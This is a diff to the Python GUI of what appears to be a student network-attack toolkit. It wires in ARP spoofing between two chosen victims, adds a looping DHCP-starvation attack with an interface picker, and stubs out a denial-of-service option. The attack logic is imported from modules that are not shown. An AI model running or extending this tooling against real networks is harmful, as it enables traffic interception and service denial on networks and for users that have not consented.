@@ -1,15 +1,16 @@
 import sys, time, traceback
 from PySide6.QtUiTools import QUiLoader
-from PySide6.QtWidgets import QApplication, QPushButton, QListWidgetItem
-from PySide6.QtCore import QFile, QIODevice, QObject, Slot, Signal, QRunnable, QThreadPool
+from PySide6.QtWidgets import QApplication, QComboBox, QListWidgetItem, QVBoxLayout
+from PySide6.QtCore import QFile, QObject, Slot, Signal, QRunnable, QThreadPool
 from networkScanner.networkScanner import scanner
 from manInTheMiddle.script import stopSpoof, spoofer
+from DHCP_Starvation.DHCP_Starvation import getInterfaces, DHCPstarving
 
 
 # Global variables
 targets = []
 scanning = False
-attacking = True
+attackingStatus = True
 
 class WorkerSignals(QObject):
 
@@ -49,13 +50,13 @@ class Worker(QRunnable):
 
 # Functions to start and stop attacking 
 def attacking(name) :
-    global attacking
-    attacking = True
+    global attackingStatus
+    attackingStatus = True
     if (name == "ARP spoofing") :
         victim1IP,victim1Mac = targets[0].split(" : ")
         victim2IP,victim2Mac = targets[1].split(" : ")
         packets = 0
-        while (attacking) :
+        while (attackingStatus) :
             spoofer(victim1IP,victim2IP,victim1Mac)
             spoofer(victim2IP,victim1IP,victim1Mac)
             printed = "[+] Sent packets "+ str(packets)
@@ -65,12 +66,27 @@ def attacking(name) :
             packets +=2
             time.sleep(2)
         print("End attacking")
+    if (name == "DHCP starving"):
+        inter = interfaces.currentText()
+        print("start attacking DHCP")
+        nbPackets = 1
+        while (attackingStatus) :
+            print ("sending packet "+str(nbPackets))
+            DHCPstarving(inter)
+            nbPackets+=1
+
+    if (name == "Denial of Service"):
+        print("End attacking")
 
 def stopAttacking(name) :
     if (name == "ARP spoofing") :
         victim1IP,victim1Mac = targets[0].split(" : ")
         victim2IP,victim2Mac = targets[1].split(" : ")
         stopSpoof(victim1IP,victim2IP,victim1Mac, victim2Mac)
+    if (name == "DHCP starving") :
+        print("")
+    if (name == "Denial of Service"):
+        print("End attacking")
 
 
 def scanning_complete():
@@ -165,10 +181,12 @@ if __name__ == "__main__":
     def startAttackClicked() :
         global attackName
         if (attackName == "None") : 
-            if (len(targets) == 2) :
-                attackName = window.attacks.currentText()
+            attackName = window.attacks.currentText()
+            if (len(targets) == 2 or attackName == "DHCP starving") :
                 window.console.append(attackName + " attack started")
                 #attacking(attackName)
+                
+                print('startinng attacking .... '+ attackName)
                 startAttackThread = Worker(attacking, attackName)
                 startAttackThread.signals.result.connect(attacking_output)
                 startAttackThread.signals.finished.connect(attacking_complete)
@@ -189,28 +207,46 @@ if __name__ == "__main__":
         global attackName
         if (attackName != "None") : 
             window.console.append(attackName + " attack stopped")
-            #stopAttacking(attackName)
+            global attackingStatus
+            attackingStatus = False
             
-            global attacking
-            attacking = False
+            #stopAttacking(attackName)
 
             stopAttackThread = Worker(stopAttacking, attackName)
             stopAttackThread.signals.result.connect(stoppingAttack_output)
             stopAttackThread.signals.finished.connect(stoppingAttack_complete)
 
             window.threadpool.start(stopAttackThread)            
-
+           
             attackName = "None"
 
         else :
             window.console.append("You should start the attack first")
+    
+    @Slot()
+    def attackSelected() :
+        attackName = window.attacks.currentText()
+        print('attack selected is :' + attackName)
 
+        if attackName == 'DHCP starving' :
+            vbox = QVBoxLayout()
+
+            global interfaces
+            interfaces = QComboBox()
+            listInterfaces = getInterfaces()
+            for inter in listInterfaces:
+                if (inter not in ['lo', 'docker0']) :
+                    interfaces.addItem(inter)
+
+            vbox.addWidget(interfaces)
+            window.boxattacks.setLayout(vbox)
 
     window.scan.clicked.connect(scan)
     window.addTarget.clicked.connect(addTargetClicked)
     window.deleteTarget.clicked.connect(deleteTargetClicked)
     window.startAttack.clicked.connect(startAttackClicked)
     window.stopAttack.clicked.connect(stopAttackClicked)
+    window.attacks.currentTextChanged.connect(attackSelected)
     
 
     window.threadpool = QThreadPool()
